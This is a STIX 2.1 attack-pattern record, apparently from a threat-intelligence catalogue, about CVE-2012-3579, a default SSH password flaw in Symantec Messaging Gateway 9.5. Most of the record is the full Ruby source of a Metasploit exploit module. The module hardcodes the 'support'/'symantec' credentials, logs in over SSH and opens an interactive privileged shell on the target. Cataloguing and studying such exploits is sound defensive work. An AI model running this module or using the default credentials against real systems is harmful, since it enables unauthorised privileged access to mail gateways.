{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9042fe30-e243-4eed-8da6-d0f24fbb94e0",
    "created": "2024-08-14T16:58:08.5071Z",
    "modified": "2024-08-14T16:58:08.507104Z",
    "name": "Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability",
    "description": " This module exploits a default misconfiguration flaw on Symantec Messaging Gateway. The 'support' user has a known default password, which can be used to login to the SSH service, and gain privileged access from remote.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/ssh/symantec_smg_ssh.rb",
            "external_id": "symantec_smg_ssh.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-3579"
        },
        {
            "source_name": "reference",
            "url": "http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&suid=20120827_00"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'net/ssh/command_stream'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::SSH\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability',\n        'Description' => %q{\n          This module exploits a default misconfiguration flaw on Symantec Messaging Gateway.\n          The 'support' user has a known default password, which can be used to login to the\n          SSH service, and gain privileged access from remote.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Stefan Viehbock', # Original discovery\n          'Ben Williams',    # Reporting the vuln + coordinated release\n          'sinn3r'           # Metasploit\n        ],\n        'References' => [\n          ['CVE', '2012-3579'],\n          ['OSVDB', '85028'],\n          ['BID', '55143'],\n          ['URL', 'http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&suid=20120827_00']\n        ],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread'\n        },\n        'Payload' => {\n          'Compat' => {\n            'PayloadType' => 'cmd_interact',\n            'ConnectionType' => 'find'\n          }\n        },\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'Targets' => [\n          ['Symantec Messaging Gateway 9.5', {}],\n        ],\n        'Privileged' => true,\n        # Timestamp on Symantec advisory\n        # But was found on Jun 26, 2012\n        'DisclosureDate' => '2012-08-27',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(22)\n    ])\n\n    register_advanced_options([\n      OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n      OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])\n    ])\n  end\n\n  def do_login(user, pass)\n    opts = ssh_client_defaults.merge({\n      auth_methods: ['password', 'keyboard-interactive'],\n      port: rport,\n      password: pass\n    })\n\n    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    begin\n      ssh = nil\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        ssh = Net::SSH.start(rhost, user, opts)\n      end\n    rescue Rex::ConnectionError\n      return\n    rescue Net::SSH::Disconnect, ::EOFError\n      print_error \"#{rhost}:#{rport} SSH - Disconnected during negotiation\"\n      return\n    rescue ::Timeout::Error\n      print_error \"#{rhost}:#{rport} SSH - Timed out during negotiation\"\n      return\n    rescue Net::SSH::AuthenticationFailed\n      print_error \"#{rhost}:#{rport} SSH - Failed authentication\"\n    rescue Net::SSH::Exception => e\n      print_error \"#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}\"\n      return\n    end\n\n    if ssh\n      conn = Net::SSH::CommandStream.new(ssh)\n      ssh = nil\n      return conn\n    end\n\n    return nil\n  end\n\n  def exploit\n    user = 'support'\n    pass = 'symantec'\n\n    print_status(\"#{rhost}:#{rport} - Attempt to login...\")\n    conn = do_login(user, pass)\n    if conn\n      print_good(\"#{rhost}:#{rport} - Login Successful (#{user}:#{pass})\")\n      handler(conn.lsock)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-08-27",
    "x_mitre_platforms": [
        "unix'"
    ]
}